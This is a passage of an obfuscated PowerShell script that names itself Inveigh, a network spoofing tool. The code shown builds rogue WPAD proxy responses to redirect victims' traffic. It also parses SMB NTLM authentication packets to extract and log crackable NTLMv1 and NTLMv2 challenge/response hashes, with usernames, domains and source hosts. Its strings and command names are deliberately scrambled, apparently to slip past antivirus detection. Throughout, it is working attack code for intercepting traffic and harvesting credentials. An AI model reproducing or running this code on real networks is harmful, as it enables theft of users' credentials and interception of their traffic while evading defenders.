            ${IN`VEiGH}."S`T`At`US_QUeue".("{1}{0}" -f 'dd','A').Invoke(('Prox'+'y '+'Authe'+'nt'+'i'+'cation '+'= '+"$ProxyAuth"))  > ${nu`lL}
            ${Pr`OXYPor`TF`AiLoVeR} = ${p`ROx`Y`porT} + 1
            ${p`RoxY`iGNorE} = (${proXy`iG`N`ORE} | &("{1}{0}{3}{2}"-f 'b','Where-O','ect','j') {${_} -and ${_}.("{0}{1}"-f 'Tri','m').Invoke()})

            if(${Pr`oxYIG`Nore}."CoU`Nt" -gt 0)
            {
                ${INVE`i`gh}."StAT`US_`qUE`UE".("{1}{0}"-f'dd','A').Invoke(("{4}{5}{1}{3}{0}{2}{6}" -f 'o','y ','re List ','Ign','P','rox','= ') + (${PRO`XYi`Gn`ORE} -join ","))  > ${NU`Ll}
            }

            if(${Pr`OXY`IP} -eq ("{0}{2}{1}"-f'0.0','0','.0.'))
            {
                ${P`RoXY_`W`pAd_ip} = ${IP}
            }
            else
            {
                ${p`ROXY_wPA`D`_IP} = ${P`RoX`yIP}
            }

            if(${w`pAd`Ip} -and ${WPaD`Port})
            {
                ${wp`AdRE`S`P`ONsE} = "function FindProxyForURL(url,host){$WPAD_direct_hosts_function return `"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $WPADIP`:$WPADPort; DIRECT`";}"
            }
            else
            {
                ${WP`ADresP`onSE} = "function FindProxyForURL(url,host){$WPAD_direct_hosts_function return `"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $proxy_wpad_IP`:$ProxyPortFailover; DIRECT`";}"
            }

        }

    }

    if(${WpaD`dirEC`Thos`Ts})
    {
        ForEach(${W`p`AD`_diReCT_hoSt} in ${WpaddiREc`T`ho`S`Ts})
        {
            ${wPaD_D`IrEcT_hos`Ts_`F`U`NctioN} += ((("{0}{2}{4}{1}{3}"-f'i','dnsDomainIs(','f','host, ouY',' ('))."Re`p`Lace"(([chaR]111+[chaR]117+[chaR]89),[StrING][chaR]34)) + ${WPAd_`D`iR`eCt_h`osT} + (((("{4}{0}{2}{5}{1}{3}"-f') re','0','tur','}DIRECT{0};','{0})','n {')) -F[cHAR]34))
        }

        ${inV`ei`GH}."st`A`TuS_q`UeUE".("{0}{1}" -f 'Ad','d').Invoke(("{3}{5}{2}{4}{1}{0}"-f' ','s =','ect Ho','WP','st','AD Dir') + (${WPA`d`diRecT`HoSts} -join ","))  > ${n`ULl}
    }

    if(${w`P`ADR`EspONSe} -and ${prO`XY} -eq 'N')
    {
        ${iNV`eI`gh}."sTATUS`_`que`UE".("{0}{1}"-f'A','dd').Invoke(("{1}{7}{6}{0}{2}{5}{4}{3}"-f'om Res','WP','p','= Enabled','nse ','o','ust','AD C'))  > ${n`ULl}
    }
    elseif(${W`PAdResP`ONSe} -and ${p`RO`XY} -eq 'Y')
    {
        ${iN`VE`igH}."S`T`Atus`_qUEuE".("{0}{1}"-f 'Ad','d').Invoke(("{5}{4}{3}{2}{0}{1}"-f 'spons','e = Enabled','y Re','rox','AD P','WP'))  > ${n`UlL}

        if(${W`pAD`Ip} -and ${WP`AD`POrT})
        {
            ${in`VE`IgH}."STaTus`_`q`UeuE".("{1}{0}" -f'd','Ad').Invoke(('WP'+'AD '+'Fa'+'i'+'lover '+'= '+"$WPADIP`:$WPADPort"))  > ${NU`Ll}
        }

    }
    elseif(${w`PaDip} -and ${wPa`dp`ORt})
    {
        ${In`VEi`Gh}."StATus`_Q`UEue".("{0}{1}" -f'A','dd').Invoke(("{2}{5}{0}{4}{1}{3}" -f 's','Ena','WPA','bled','ponse = ','D Re'))  > ${Nu`LL}
        ${IN`VE`iGh}."st`Atu`s_q`UEue".("{0}{1}"-f 'A','dd').Invoke(('W'+'PAD '+'= '+"$WPADIP`:$WPADPort"))  > ${n`Ull}
        
        if(${wPADDi`R`ECT`hOs`Ts})
        {
            ForEach(${w`Pad_d`Ire`Ct_`Host} in ${WpADdIR`Ec`T`H`OsTS})
            {
                ${W`pAd_`d`I`R`ECT_`hOSTs`_`FUNcTiON} += (((("{0}{3}{2}{1}{4}"-f 'if','DomainIs(host','ns',' (d',', h2H'))-rePLACe  'h2H',[chAr]34)) + ${w`P`Ad_DiR`E`cT_hoST} + ((("{2}{6}{3}{4}{1}{0}{7}{5}" -f'C','ECT','Cd6','rn Cd6','DIR','6;',')) retu','d'))."rep`la`CE"('Cd6',[sTRinG][chAr]34))
            }

            ${Wp`A`dReSpON`Se} = "function FindProxyForURL(url,host){" + ${Wpa`D_`diReCT_hOstS`_f`U`Nction} + ('retur'+'n '+"`"PROXY "+'') + ${Wp`ADIP} + ":" + ${wpa`DP`Ort} + "`";}"
            ${InV`EiGH}."staTUs`_QuE`Ue".("{1}{0}"-f 'd','Ad').Invoke(("{1}{4}{0}{2}{3}"-f'ct','WPAD',' Ho','sts = ',' Dire') + (${wPAddI`R`ECT`hOsts} -join ","))  > ${Nu`Ll}
        }
        else
        {
            ${Wp`ADre`Sp`ONSE} = "function FindProxyForURL(url,host){$WPAD_direct_hosts_function return `"PROXY $WPADIP`:$WPADPort; DIRECT`";}"
        }

    }
    elseif(${WpaDd`Ir`eC`TfILE} -eq 'Y')
    {
        ${INv`e`IgH}."S`TatUS_`que`UE".("{1}{0}"-f'd','Ad').Invoke(("{1}{4}{0}{2}{3}{5}" -f 'ult Res','WPAD D','ponse',' = En','efa','abled'))  > ${nu`ll}
        ${wpAD`Respo`Nse} = "function FindProxyForURL(url,host){return `"DIRECT`";}"
    }

    if(${ChaL`LE`NGE})
    {
        ${i`NveigH}."s`T`ATus_Qu`EUe".("{0}{1}"-f 'A','dd').Invoke(('NT'+'LM '+'Cha'+'llenge'+' '+'= '+"$Challenge"))  > ${nu`Ll}
    }

}

if(${M`Ac`hine`AcCOUNTS} -eq 'N')
{
    ${IN`V`EiGH}."Status`_`qUeUe".("{0}{1}" -f'Ad','d').Invoke(("{4}{1}{2}{0}{5}{3}" -f 't Capture = D','hine Accou','n','abled','Mac','is'))  > ${Nu`LL}
    ${i`N`VEigH}."maC`hI`NE_AcCouN`TS" = ${fa`Lse}
}
else
{
    ${I`NVEigh}."mAchIne_a`cC`oU`N`Ts" = ${TR`Ue}
}

if(${cONsO`LE`OUT`puT} -ne 'N')
{

    if(${coN`sOLEou`TpuT} -eq 'Y')
    {
        ${In`Ve`iGh}."sta`TUS_qu`Eue".("{1}{0}" -f'd','Ad').Invoke(("{4}{1}{2}{6}{3}{0}{5}" -f 'le','ime',' Console Outp','t = Enab','Real T','d','u'))  > ${N`ULl}
    }
    else
    {
        ${i`NvE`Igh}."stAt`U`s_QuEue".("{1}{0}"-f'd','Ad').Invoke(('Real'+' '+'Time'+' '+'C'+'onsole'+' '+'O'+'u'+'tput '+'= '+"$ConsoleOutput"))  > ${nU`Ll}
    }

    ${IN`VeIGh}."C`oNs`ole`_outP`UT" = ${t`RUE}

    if(${CO`Ns`olE`sTaTuS} -eq 1)
    {
        ${in`VeI`gH}."Sta`TU`s_Q`Ueue".("{0}{1}"-f'Ad','d').Invoke(('C'+'on'+'sole '+'Statu'+'s '+'= '+"$ConsoleStatus "+'M'+'inute'))  > ${N`ULl}
    }
    elseif(${c`oNsolEs`T`ATus} -gt 1)
    {
        ${INVe`I`GH}."sta`TU`S_qUEUe".("{0}{1}" -f 'Ad','d').Invoke(('Co'+'nso'+'le '+'Statu'+'s '+'= '+"$ConsoleStatus "+'Minut'+'es'))  > ${N`ULL}
    }

}
else
{

    if(${i`Nve`IGh}."To`oL" -eq 1)
    {
        ${i`N`VeIGH}."S`TAtUs_`QuEuE".("{0}{1}"-f'A','dd').Invoke(("{14}{4}{16}{13}{1}{0}{7}{9}{3}{6}{10}{8}{2}{15}{5}{12}{11}"-f 'i','T',' T','sole O','ea',' External T','utput Disable','me C','e','on','d Du','ol Selection','o',' ','R','o','l'))  > ${NU`ll}
    }
    else
    {
        ${in`VEi`gH}."sTAtU`S_q`U`EUe".("{0}{1}"-f'A','dd').Invoke(("{3}{0}{8}{1}{5}{6}{7}{2}{4}{9}"-f 'eal T','Console Out','isabl','R','e','p','ut = ','D','ime ','d'))  > ${N`ULL}
    }

}

if(${cO`N`sO`le`UNiQue} -eq 'Y')
{
    ${InVE`i`Gh}."ConsO`l`E_UNi`Que" = ${t`RUE}
}
else
{
    ${iNVeI`GH}."C`OnsOLE`_`UnIQUe" = ${FA`LSe}
}

if(${F`iLe`oU`TPUT} -eq 'Y')
{
    ${In`VEi`GH}."STa`Tu`S_quE`Ue".("{1}{0}" -f'dd','A').Invoke(("{4}{5}{1}{0}{3}{2}"-f 'Output = ','e File ','abled','En','Re','al Tim'))  > ${nU`Ll}
    ${INVeI`gh}."st`A`TUs_QUEuE".("{0}{1}" -f 'Ad','d').Invoke(('O'+'u'+'tput '+'Dir'+'e'+'ctory '+'= '+"$output_directory"))  > ${n`ULl}
    ${In`Vei`Gh}."FI`LE_o`Utput" = ${TR`UE}
}
else
{
    ${inV`eI`Gh}."STa`TuS_Q`Ue`Ue".("{1}{0}"-f 'dd','A').Invoke(("{1}{4}{0}{5}{2}{3}"-f'al Time File Ou','R','Disa','bled','e','tput = '))  > ${nU`LL}
}

if(${fiL`eu`Ni`QuE} -eq 'Y')
{
    ${In`VeIgH}."Fi`le_`UNiq`UE" = ${tr`UE}
}
else
{
    ${I`Nv`EIgH}."Fi`L`E_uNiq`UE" = ${Fa`L`se}
}

if(${R`U`N`COunt})
{
    ${I`Nv`eigh}."staTuS_`q`UeUe".("{1}{0}"-f'dd','A').Invoke(('R'+'un '+'Co'+'unt '+'= '+"$RunCount")) > ${n`ULL}
}

if(${R`UnTi`ME} -eq 1)
{
    ${I`Nve`igH}."st`ATu`S_Qu`EUe".("{1}{0}"-f'dd','A').Invoke(('Ru'+'n '+'Ti'+'me '+'= '+"$RunTime "+'M'+'inu'+'te'))  > ${nU`LL}
}
elseif(${RU`Nti`mE} -gt 1)
{
    ${inV`EiGh}."STaTUS_Q`U`E`UE".("{1}{0}"-f'dd','A').Invoke(('Ru'+'n '+'T'+'ime '+'= '+"$RunTime "+'M'+'inute'+'s'))  > ${nU`lL}
}

if(${SHo`wH`ElP} -eq 'Y')
{
    ${i`NV`eigh}."S`TAtUs_Qu`euE".("{1}{0}" -f'd','Ad').Invoke(("{5}{4}{1}{2}{6}{3}{0}" -f 'eigh','nveigh t','o s',' Inv','-I','Run Stop','top'))  > ${nu`LL}
        
    if(${iN`VE`IgH}."consO`le_OU`TPUt")
    {
        ${INV`eigh}."StATuS`_Q`UE`UE".("{1}{0}"-f'dd','A').Invoke(("{4}{9}{0}{3}{10}{8}{7}{12}{1}{6}{11}{2}{5}" -f' key','e','u',' to ','Pre','t',' ','al time con','op re','ss any','st','outp','sol'))  > ${n`ULL}
    }

}

if(${inV`e`IGH}."sTA`TUS_`Ou`TPut")
{

    while(${I`N`VeIGH}."sTaT`U`S_quE`Ue"."cOU`NT" -gt 0)
    {

        switch -Wildcard (${I`NvEiGh}."StA`T`Us_`quEUE"[0])
        {

            {${_} -like ("{4}{5}{3}{2}{0}{1}"-f'led Due ','To *','b','isa','*',' D') -or ${_} -like ("{1}{4}{5}{7}{0}{3}{6}{2}"-f've','Run ','to stop Inveigh','igh','St','op-',' ','In') -or ${_} -like ("{0}{4}{1}{5}{2}{3}"-f 'Wi','s Fir','l =',' Enabled','ndow','ewal')}
            {

                if(${INV`Ei`gh}."oU`Tput_S`T`REam_oNLy")
                {
                    &("{3}{1}{0}{2}"-f'Out','e-','put','Writ')(${iNV`eIGh}."sTa`TU`s_Que`Ue"[0] + ${I`NVEI`GH}."New`LiNE")
                }
                else
                {
                    &("{1}{4}{0}{2}{3}" -f'e','Wr','-War','ning','it')(${in`VEI`GH}."S`TATUs_que`Ue"[0])
                }

                ${I`NV`EigH}."S`T`At`US_QUeUE".("{1}{0}{2}"-f 'o','Rem','veAt').Invoke(0)
            }

            ("{1}{0}{2}"-f 'efau','d','lt')
            {

                if(${I`NvE`Igh}."OU`TPU`T_StrE`A`M_onLY")
                {
                    &("{1}{2}{0}"-f 'ut','Wri','te-Outp')(${i`Nv`eIgH}."s`Tatu`s_`quEUE"[0] + ${inv`E`IgH}."n`eWLi`NE")
                }
                else
                {
                    &("{2}{0}{3}{1}" -f'te','ut','Wri','-Outp')(${In`Veigh}."S`TAtUS`_`QuEUE"[0])
                }

                ${In`Vei`gh}."STaT`U`s_`quEUE".("{1}{0}{2}" -f 'ove','Rem','At').Invoke(0)
            }

        }

    }

}




${s`HarED_`BA`sic_F`U`NCTi`oNS_`sCrIpt`BLoCK} =
{

    function dat`A`TOuinT16(${F`IE`LD})
    {
	     (  GeT-variAbLE ("yG"+"aT1E") -ValUEoN )::("{0}{1}{2}"-f 'R','e','verse').Invoke(${fI`eLd})
	   return  ${5`e9a}::("{1}{0}"-f 'Int16','ToU').Invoke(${fIE`ld},0)
    }

    function dA`TatOU`iNT`32(${F`i`ELD})
    {
	     (Get-VarIable  YGAT1e)."V`AluE"::("{2}{1}{0}"-f'e','evers','R').Invoke(${fi`eld})
	   return   (  vaRiable ('5e'+'9a') )."vA`LuE"::("{2}{0}{1}" -f 't','32','ToUIn').Invoke(${f`iElD},0)
    }

    function da`T`AlENGTh2
    {
        param ([Int]${l`En`gt`H_sTaRT},[Byte[]]${stR`Ing_ExTR`AcT_D`ATA})

        ${S`TRI`Ng`_l`engtH} =  ( Gi ('VAR'+'Iabl'+'E:5e9A') )."vAl`UE"::"TOuI`NT`16"(${st`RI`NG`_eXTRAC`T_`DAta}[${LE`N`GtH`_sTarT}..(${lENgtH`_`STaRT} + 1)],0)
        return ${sT`RiN`g_Len`g`TH}
    }

    function D`At`AleNGth4
    {
        param ([Int]${len`gt`h_S`T`ARt},[Byte[]]${S`Tri`Ng_`exTracT_`DA`Ta})

        ${s`TRing`_LENGth} =  ( vARiable ('5'+'e9A') )."v`AlUE"::"T`ou`Int32"(${strIng`_EXTRa`Ct_`dAta}[${LE`NGt`h_`st`ARt}..(${lE`N`g`TH`_STart} + 3)],0)
        return ${S`T`Ring`_lE`NGTh}
    }

    function d`A`TATo`strinG
    {
        param ([Int]${stRIN`g`_STARt},[Int]${S`TRIn`g_LeNg`TH},[Byte[]]${Strin`g`_eXtRAC`T`_dA`TA})

        ${strInG`_da`TA} =   (vaRIablE  5e9A )."V`ALUe"::"TOstr`ing"(${sTR`iNg_`eXTR`AcT_DaTA}[${sTrI`Ng_S`TARt}..(${STrI`NG_`S`Tart} + ${S`T`Rin`G_`Length} - 1)])
        ${stRi`NG`_data} = ${STriN`G_D`ATa} -replace "-00",""
        ${sTRIN`G_D`ATa} = ${St`Ri`NG_Da`TA}.("{1}{0}"-f 'lit','Sp').Invoke("-") | &("{0}{3}{2}{4}{1}" -f'F','ject','ach-O','orE','b'){[Char] (  VARiAbLe ('vW'+'e')  -Va )::("{1}{0}{2}" -f'n','ToI','t16').Invoke(${_},16)}
        ${St`R`ing_e`XtR`AcT} = &("{0}{1}{2}"-f 'New-Obj','ec','t') ("{1}{2}{0}{3}" -f'St','Syste','m.','ring') (${sT`RiNG_`DA`Ta},0,${S`TrIN`g_dAtA}."l`ENgTh")
        return ${str`i`N`g_eXTRa`CT}
    }

    function c`oNv`ErT`From-p`A`CK`EToRderEdDICT`Io`N`Ary
    {
        param(${p`ACKE`T_`orde`R`Ed_`dIctIO`NAry})

        ForEach(${FI`e`lD} in ${pAC`ke`T_`O`RDErED`_dIctioNARY}."VA`lueS")
        {
            ${bYte`_`ArraY} += ${F`IeLd}
        }

        return ${b`y`TE_ARray}
    }

}


${SMb_`NtLm_fUNc`TioNS`_sC`Ri`PTBLoCk} =
{

    function sMbNTlm`chA`LlEngE
    {
        param ([Byte[]]${P`AYLOad_b`YTES})

        ${PA`yLO`Ad} =   (gET-CHIlDiTEm ('VaR'+'i'+'ABLe'+':'+'5e9A'))."va`LUE"::("{1}{0}" -f 'tring','ToS').Invoke(${pAyL`O`AD`_byt`es})
        ${PA`YlO`Ad} = ${P`AYl`oaD} -replace "-",""
        ${ntl`m_I`N`DEx} = ${PA`y`LoaD}.("{0}{1}"-f 'In','dexOf').Invoke(("{1}{2}{0}" -f '0','4E544C4D5353','500'))

        if(${NT`lm_`ind`Ex} -gt 0 -and ${pAYL`oaD}.("{0}{1}{2}"-f'Sub','St','ring').Invoke((${nTLm`_In`dEx} + 16),8) -eq ("{1}{0}"-f'000','02000'))
        {
            ${NtLM_c`H`Al`LEn`ge} = ${P`AylO`Ad}.("{1}{0}"-f 'String','Sub').Invoke((${NT`l`m_In`DeX} + 48),16)
        }

        return ${NtlM`_CHallE`NGE}
    }

    function S`MB`NtL`MreSPon`se
    {
        param ([Byte[]]${PAy`LOaD_`B`YTES})

        ${paYlO`AD} =  ${5`e9A}::("{2}{1}{0}"-f 'ng','oStri','T').Invoke(${P`AY`lOad_`BYTES})
        ${P`AYLO`Ad} = ${p`AylO`Ad} -replace "-",""
        ${ntL`mSS`P_H`Ex`_O`F`FsET} = ${P`AylO`AD}.("{0}{1}" -f 'In','dexOf').Invoke(("{3}{1}{2}{0}"-f'000','4D5353','5','4E544C'))

        if(${Nt`L`mS`SP_H`Ex_oF`FseT} -gt 0 -and ${pa`ylo`Ad}.("{2}{1}{0}"-f 'ing','ubStr','S').Invoke((${n`Tlm`SSp_H`Ex_OFfseT} + 16),8) -eq ("{1}{2}{0}"-f'000','0300','0'))
        {
            ${NtlM`sSp`_`OfFSET} = ${nT`lmSsP_HEX`_`oFf`S`ET} / 2

            ${lm_`l`EN`GTH} = &("{3}{2}{1}{0}"-f 'th2','Leng','a','Dat') (${NTl`mSSP_O`FF`SeT} + 12) ${PAYLO`Ad_Byt`eS}
            ${Lm_`Of`F`sEt} = &("{1}{0}{2}" -f'Leng','Data','th4') (${n`TLm`sSP_OFF`Set} + 16) ${pAYl`Oa`D_by`TES}
            ${lM_`Re`Sp`OnSe} =  (  CHIlditeM ("vaRiAblE"+":"+"5"+"e9"+"A") )."V`ALUe"::"tOs`T`RIng"(${Pa`YLoa`D`_`BytEs}[(${N`TL`Mss`P`_offSET} + ${l`M_`OfFSeT})..(${n`TL`Mssp_O`FFsET} + ${lm_`offs`et} + ${LM_`L`eNgTH} - 1)]) -replace "-",""

            ${nt`LM_`LE`NGth} = &("{1}{3}{0}{2}"-f'Length','D','2','ata') (${ntL`mSs`p_oFf`seT} + 20) ${PayLo`AD`_B`yT`es}
            ${N`T`l`M_ofFsEt} = &("{2}{0}{3}{1}"-f'g','h4','DataLen','t') (${nt`lM`ssp`_offsET} + 24) ${PAYl`OAD_b`Y`TES}
            ${NtLm`_`R`EsP`ONsE} =  (geT-ItEm  VAriable:5e9a)."Va`lue"::"ToSTRI`NG"(${P`AY`LoA`d_bytES}[(${NTlm`ssP_`o`F`FsET} + ${ntL`m`_oFfS`Et})..(${n`TlMssp_`o`FfS`eT} + ${N`TL`m_O`FFSeT} + ${ntlM_`LEn`G`Th} - 1)]) -replace "-",""

            ${DOmaiN`_leng`Th} = &("{0}{2}{1}"-f 'Da','2','taLength') (${N`T`l`MSsP_OffS`ET} + 28) ${PayloAd`_b`Y`T`es}
            ${DoMaiN`_`Of`F`sEt} = &("{1}{2}{0}{3}" -f 'a','Da','t','Length4') (${Ntlm`ssP`_`OfFset} + 32) ${p`AYl`o`Ad_bYTes}
            ${nTlM`_DO`maI`N_sT`R`iNG} = &("{2}{3}{0}{1}" -f'ToStrin','g','D','ata') (${NTL`MSsP`_`O`FfSET} + ${DOmai`N`_`oFFset}) ${dOMAI`N`_lEn`Gth} ${pay`L`OAd_By`T`es}

            ${USE`R_L`E`NgTh} = &("{1}{3}{0}{2}"-f 'ng','D','th2','ataLe') (${nT`lms`Sp_`oF`FsET} + 36) ${PaYLoAd_`B`y`TeS}
            ${US`Er_OF`F`Set} = &("{3}{1}{0}{2}"-f'gt','en','h4','DataL') (${ntLMssp`_`o`FfsET} + 40) ${Pa`Y`LoAd_`ByT`es}
            ${nTLm_`U`SeR`_S`TR`ING} = &("{0}{1}{2}" -f 'DataToStri','n','g') (${NTlmSSP`_offs`Et} + ${USEr_`OFf`sET}) ${uSEr_L`e`Ng`TH} ${pa`yL`oad_b`Y`Tes}

            ${HoST_L`E`NG`Th} = &("{0}{2}{1}"-f 'DataLeng','h2','t') (${NtlmSSp_o`FF`s`eT} + 44) ${pAy`l`OaD_by`T`ES}
            ${hos`T_off`s`eT} = &("{3}{1}{2}{0}" -f '4','ata','Length','D') (${n`TLmSSP`_oFf`SEt} + 48) ${p`AY`load`_`BYTeS}
            ${NT`LM_HOsT`_s`TriNG} = &("{0}{2}{1}{3}" -f'DataT','in','oStr','g') (${NT`lM`ssp_oF`FS`et} + ${HOs`T_Off`S`Et}) ${HOSt`_`LengtH} ${PaYloAd_`B`Y`TEs}

            if(${ntlM_L`e`Ngth} -gt 24)
            {
                ${ntl`mv`2_resp`o`N`SE} = ${ntlM_`R`ESpON`SE}.("{1}{0}"-f 't','Inser').Invoke(32,':')
                ${ntL`mV`2_hA`sH} = ${Nt`L`M_uSer_`stRiNG} + "::" + ${Nt`L`m_domai`N_sT`RInG} + ":" + ${n`TLM_CHa`lLe`N`ge} + ":" + ${nTLmv2_`Re`s`pONsE}

                if(${sOUr`ce`_iP} -ne ${IP} -and (${i`NV`eigH}."m`AC`HIN`E_AC`cOUnTs" -or (!${IN`VE`IgH}."mA`Ch`I`NE_AcCoUnts" -and -not ${ntL`m_`U`sEr_`STrI`NG}.("{0}{1}{2}" -f 'E','nd','sWith').Invoke('$'))))
                {

                    if(${IN`VEigH}."FiLE_out`P`Ut")
                    {
                        ${inV`Ei`Gh}."LO`g_f`Ile_Q`UeUE".("{1}{0}" -f'd','Ad').Invoke(("$(Get-Date -format 's') - SMB NTLMv2 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string) "))
                    }

                    if(${i`Nv`EIgh}."LOg_O`Ut`puT")
                    {
                        ${INVe`IGh}."l`og".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - SMB NTLMv2 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string) "))
                    }

                    ${Inve`i`Gh}."Nt`lMV`2_lIST".("{1}{0}"-f 'd','Ad').Invoke(${nt`Lmv2_`H`AsH})

                    if(!${IN`VEi`Gh}."con`SolE_u`NI`que" -or (${I`NVEIgH}."ConsO`le_`U`NiQuE" -and ${iNvE`I`GH}."nTlMv2_u`s`Ern`AME_Li`sT" -notcontains ("$source_IP "+"$NTLM_domain_string\$NTLM_user_string")))
                    {
                        ${I`NVE`IGH}."co`NsOLe_`Q`U`eue".("{0}{1}" -f'A','dd').Invoke(("$(Get-Date -format 's') - SMB NTLMv2 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLMv2_hash "))
                    }
                    else
                    {
                        ${iNVe`iGH}."C`ONSolE_q`UeUe".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - SMB NTLMv2 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLM_domain_string\$NTLM_user_string - not unique "))
                    }

                    if(${InVE`I`Gh}."fil`e_`Out`PuT" -and (!${i`Nv`eiGh}."F`ilE`_unIQuE" -or (${i`NVe`iGH}."fIl`E_uN`iQUe" -and ${I`Nv`EiGH}."ntLmv2_`U`ser`NAmE_`l`isT" -notcontains ("$source_IP "+"$NTLM_domain_string\$NTLM_user_string"))))
                    {
                        ${i`NvEIgh}."NtlMV`2_`FILe_`QUeUE".("{1}{0}" -f 'd','Ad').Invoke(${NTL`M`V2`_HaSH})
                        ${In`VeigH}."Co`N`S`OL`e_QuEuE".("{0}{1}" -f 'Ad','d').Invoke(("{9}{7}{6}{1}{4}{0}{8}{2}{5}{3}"-f'on','ge/res','e writte',' ','p','n to','NTLMv2 challen',' ','s','SMB') + ${iN`VE`iGH}."NtL`Mv2_O`UT`_FI`LE")
                    }

                    if(${Inv`E`igh}."NTl`Mv2_`UsEr`NAME`_li`ST" -notcontains ("$source_IP "+"$NTLM_domain_string\$NTLM_user_string"))
                    {
                        ${i`NvEIGh}."NTLmV`2`_u`SErnam`e_`l`isT".("{0}{1}"-f'Ad','d').Invoke(("$source_IP "+"$NTLM_domain_string\$NTLM_user_string"))
                    }

                    if(${i`NVei`gh}."iP`_ca`PTURE_List" -notcontains ${sOu`RC`e_ip} -and -not ${n`TLM`_`USeR_`STrINg}.("{2}{1}{0}" -f 'h','it','EndsW').Invoke('$') -and !${inVe`i`gh}."S`pooFe`R_REPeAt" -and ${so`Urc`e_Ip} -ne ${i`p})
                    {
                        ${IN`VeI`GH}."i`P_CapTUre_li`ST".("{1}{0}"-f 'd','Ad').Invoke(${so`Ur`CE_iP}."ipad`DR`eSStoSt`R`ing")
                    }

                }

            }
            elseif(${nTL`M_`LEN`GTh} -eq 24)
            {
                ${ntLm`V1_`HA`sh} = ${nTLM_us`e`R`_STrinG} + "::" + ${NT`lm`_D`OmAIn_strING} + ":" + ${L`m_Re`SPo`NsE} + ":" + ${nt`l`m_Re`sPO`NSE} + ":" + ${n`T`lM_CHA`llENGe}

                if(${sOU`RCe`_ip} -ne ${iP} -and (${i`NveIGh}."Ma`chinE_acCo`UNts" -or (!${INV`E`iGh}."mAChIne_`AccO`U`NTs" -and -not ${NT`l`M_USeR`_ST`R`ing}.("{1}{0}"-f'th','EndsWi').Invoke('$'))))
                {

                    if(${I`NvEi`gH}."F`ILE_Out`P`UT")
                    {
                        ${I`N`VEiGh}."Log_fiL`e`_QUeUE".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - SMB NTLMv1 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string) "))
                    }

                    if(${iN`VEigH}."LOG`_O`UTpUt")
                    {
                        ${inv`E`iGH}."l`Og".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - SMB NTLMv1 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string) "))
                    }

                    ${Inv`eIGh}."nT`lm`V1_LiST".("{0}{1}" -f 'A','dd').Invoke(${nTlmV1`_h`A`Sh})

                    if(!${In`V`EIgH}."CO`NsOl`E`_uN`iqUE" -or (${i`NveI`Gh}."CON`SOLE`_u`N`IQUe" -and ${In`VeI`GH}."NTlM`V1_usErN`A`ME_L`ist" -notcontains ("$source_IP "+"$NTLM_domain_string\$NTLM_user_string")))
                    {
                        ${invE`Igh}."C`o`NSOLE`_QuEUe".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') SMB NTLMv1 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLMv1_hash "))
                    }
                    else
                    {
                        ${I`NVe`igH}."con`So`LE_qUEue".("{1}{0}" -f 'dd','A').Invoke(("$(Get-Date -format 's') - SMB NTLMv1 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLM_domain_string\$NTLM_user_string - not unique "))
                    }

                    if(${i`NVE`iGH}."fiLe_o`U`Tp`UT" -and (!${In`Ve`iGH}."f`Il`E_Uni`Que" -or (${I`NVe`IgH}."fiL`e`_uNiQ`UE" -and ${iN`VeI`GH}."NT`L`mv1`_uS`erName_l`I`sT" -notcontains ("$source_IP "+"$NTLM_domain_string\$NTLM_user_string"))))
                    {
                        ${In`V`EiGH}."NtlMV1_fILE`_`qu`EuE".("{1}{0}" -f 'd','Ad').Invoke(${Nt`lmv`1_`HaSh})
                        ${I`NV`eIGh}."CoNs`OLe_`QuEuE".("{0}{1}"-f'A','dd').Invoke(("{3}{1}{0}{5}{2}{6}{8}{7}{4}" -f'LM','B NT','o','SM','n to ','v1 challenge/resp','nse ','e','writt') + ${iNve`I`GH}."nt`LM`V`1_OU`T_fiLe")
                    }

                    if(${i`NvEigh}."n`TlmV1_U`Se`RnamE`_`LI`ST" -notcontains ("$source_IP "+"$NTLM_domain_string\$NTLM_user_string"))
                    {
                        ${In`VEi`gH}."NT`lmV1_Us`ER`NAme_LI`ST".("{0}{1}"-f 'A','dd').Invoke(("$source_IP "+"$NTLM_domain_string\$NTLM_user_string"))
                    }

                    if(${InvE`iGh}."ip_Ca`ptuRE`_`lIST" -notcontains ${So`UrcE_`IP} -and -not ${nTL`M_`USeR_STri`NG}.("{1}{0}" -f'th','EndsWi').Invoke('$') -and !${iN`V`eiGh}."spo`ofER`_rEpeaT" -and ${S`oUR`CE`_IP} -ne ${i`p})
                    {
                        ${I`NVeI`gH}."I`p_`C`APTURe_liST".("{0}{1}" -f 'Ad','d').Invoke(${sO`U`RcE_Ip}."ip`ADDrESST`oST`Ring")
                    }

                }

            }

        }

    }

}


${htt`P_scr`Ipt`B`lOCk} = 
{ 
    param (${c`hal`l`ENGe},${HTtpau`Th},${HTTPba`si`c`R`ealM},${HtTp`cO`N`T`eNtt`Ype},${hT`T`pIp},${h`Tt`p`pOrT},${h`TtpD`EFA`Ult`Exe},${hT`T`PdeFau`ltf`IlE},${hTT`PD`Ir},${hTtp`Res`eT`D`elAy},${Http`RE`s`ETdE`lAYtI`meO`Ut},${HTtpr`esp`o`NsE},
    ${H`TTP`S_li`stEner},${nBNS`Bru`T`efO`RCEPAU`se},${pR`OXy},${pr`O`x`yigNoRe},${p`ROxY`_L`ISTEnER},${w`pAdautH},${wpAdA`U`Th`ig`NoRe},${WPAdRes`P`On`SE})

    function NTLM`CHa`lLENgEbA`sE64
    {
        param ([String]${Chal`lEN`Ge},[Bool]${NTL`Me`sS},[String]${C`liENT`i`PAdDResS},[Int]${C`lIeNtPo`RT})

        ${h`TT`P`_timeST`AmP} = &("{1}{0}"-f'-Date','Get')
        ${hTtp_`TI`mest`AMp} = ${HtTP_`TIm`esTA`mp}.("{3}{0}{2}{1}"-f'leT','me','i','ToFi').Invoke()
